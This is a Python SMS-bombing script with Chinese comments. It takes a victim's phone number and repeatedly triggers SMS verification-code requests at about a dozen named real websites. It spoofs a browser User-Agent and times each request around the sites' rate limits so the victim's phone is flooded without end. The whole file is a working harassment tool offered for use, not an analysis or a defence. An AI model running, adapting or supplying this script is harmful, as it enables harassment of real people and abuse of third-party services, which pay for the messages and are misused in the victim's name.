#!/usr/bin/python3

#MIT License
#
#Copyright (c) 2019 Blume
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

import sys, getopt, requests, time

fake_headers = {
    "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
}

target = 0 #目标手机号
total = 0 #已发送的短信数量

class CExploit():
    def __init__(self, name, url, delay, postorget, data):
        self.name = str(name) #名字
        self.url = str(url) #链接
        self.delay = int(delay) #延迟
        self.postorget = bool(postorget) #post(true)或者是get(false)
        self.data = data #数据，可以是json也可以是参数
        self.ticks = 0.0 #unix时间戳

    def setMobile(self, pmobile):
        if self.postorget:
            for i in self.data:
                if type(self.data[i]) == str: #是字符串
                    if self.data[i] == "__MOBILE":
                        self.data[i] = str(pmobile) #换成设置的手机号
        else:
            if type(self.data) == str:
                self.data = self.data.replace("__MOBILE", str(pmobile)) #类似同上

    def attack(self):
        try:  
            if self.postorget:
                r = requests.post(self.url, data=self.data, headers=fake_headers)
                #print(r.text)
                #print(r.status_code)
            else:
                #print(self.url + self.data)
                r = requests.get(self.url + self.data, headers=fake_headers)
                #print(r.text)
                #print(r.status_code)
            global total
            total += 1
        except:
            print("Failed to call \"%s\" api" % (self.name))

exploits = [
    CExploit("OCQ云智能管理", "http://app.imocq.com/login/registerInMobilePhone", 60, True, {"emailMobilePhone":"__MOBILE"}),
    CExploit("娄江论坛", "http://bbs.jrkunshan.cn/file/meisheng/ajaxsend.php", 60, True, {"mobile":"__MOBILE"}),
    CExploit("大V店", "http://usercenter.chinadaily.com.cn/regist/getPhoneValidateCode", 60, True, {"phonenum":"__MOBILE"}),
    CExploit("捷才教育", "http://user.yzjcpx.com/sms/yanzheng.html", 120, False, "?mobile=__MOBILE"),
    CExploit("四川省特种设备考试机构报名系统", "http://t.scasei.org.cn/ajax/send-mobile-code", 30, True, {"mobile":"__MOBILE", "usage":"register"}),
    CExploit("大V店", "http://s.davdian.com/index.php?c=sms&a=send", 60, True, {"mobile":"__MOBILE"}),
    CExploit("Dfv", "http://www.defuv.com/index.php/Ajax/send_msg", 60, False, "?mobile=__MOBILE"),
    CExploit("私募排排网", "https://fof.simuwang.com/index.php?c=Login&a=getRegisterPhoneCode", 60, False, "&phone=__MOBILE"),
    CExploit("迪卡侬", "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code", 30, True, {"countryCode":"CN","mobile":"__MOBILE"}),
    CExploit("中华支教与助学信息中心(CTA)", "http://www.cta613.org/sendsms.php", 60, True, {"y":1, "sj":"__MOBILE"}),
    CExploit("金融号", "http://jrh.financeun.com/Login/sendMessageCode3.html", 60, False, "?mobile=__MOBILE&mbid=197858")
    #########由于某种未知原因无法使用
    #CExploit("超级简历", "https://www.wondercv.com/verify_tokens/phone", 60, True, {"phone_number":"__MOBILE"}),
    #CExploit("和讯", "https://reg.hexun.com/ajax/login_ajax.aspx", 60, True, {"mobile":"__MOBILE", "verifycode":"", "act": "sendsms_login"}),
    #CExploit("华图在线", "http://api.huatu.com/lumenapi/v4/common/message/send_by_java", 60, False, "?mobile=__MOBILE"),
    #CExploit("快速注册通道", "http://j.seo691.com/register/getverify.html", 90, False, "?reg_mobile=__MOBILE"),
    #########
]

try:
    opts, args = getopt.getopt(sys.argv[1:], "hn:d:",
    ["help","number=","delay="])

except getopt.GetoptError as err:
    print(str(err))  # will print something like "option -a not recognized"
    sys.exit()

if not opts:
    sys.exit()

last_send = 0.0
delay = 0.0
delay_set = False

for opt_name,opt_value in opts:
    if opt_name == '-n':
        target = int(opt_value)

        for i in range(len(exploits)):
            exploits[i].setMobile(target)

    if opt_name == '-d':
        delay = float(opt_value)
        delay_set = True

if not delay_set:
    delay = 3 #默认是三秒

if target > 0:
    try:
        while(True):
            for i in range(len(exploits)):
                if time.time() - exploits[i].ticks >= exploits[i].delay: #服务端上的限制时间
                    #print("%d %f, %f, %f" % (i, time.time(), last_send, delay))
                    if time.time() - last_send >= delay: #用户自己设置的延迟 (如果是0，就像是霰弹枪一下子全部打出去)
                        exploits[i].attack()
                        last_send = exploits[i].ticks = time.time()
                        print("Sent \033[91m%d\033[0m messages" % (total));

    except KeyboardInterrupt:
        print("\nMission terminated")
else:
    print("Invalid mobile number")
